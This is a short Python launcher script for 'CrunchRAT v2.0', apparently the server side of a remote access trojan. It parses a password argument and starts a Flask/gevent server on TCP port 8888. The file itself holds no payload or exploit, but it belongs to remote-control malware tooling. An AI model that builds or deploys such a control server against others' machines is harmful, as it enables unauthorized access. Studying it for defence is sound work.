import argparse
from colorama import Fore, Style
from gevent.wsgi import WSGIServer
from app import app


if __name__ == '__main__':
    # command-line argument parsing
    parser = argparse.ArgumentParser(prog='CrunchRAT.py',
                                     description='CrunchRAT v2.0')
    parser.add_argument('password',
                        action='store',
                        type=str,
                        help='server password')
    args = parser.parse_args()

    # sets application-wide variable for the server password
    app.server_password = args.password

    # tries to start Flask server on tcp/8888
    try:
        server = WSGIServer(('0.0.0.0', 8888), app)
        print(Fore.GREEN + '[+] Server started on tcp/8888.' + Style.RESET_ALL)
        server.serve_forever()

    # KeyboardInterrupt exception
    except KeyboardInterrupt:
        print(Fore.GREEN + '[+] Server stopped on tcp/8888.' + Style.RESET_ALL)

    # exception raised starting Flask server
    except Exception as e:
        print(Fore.RED + '[-] ' + str(e) + Style.RESET_ALL)
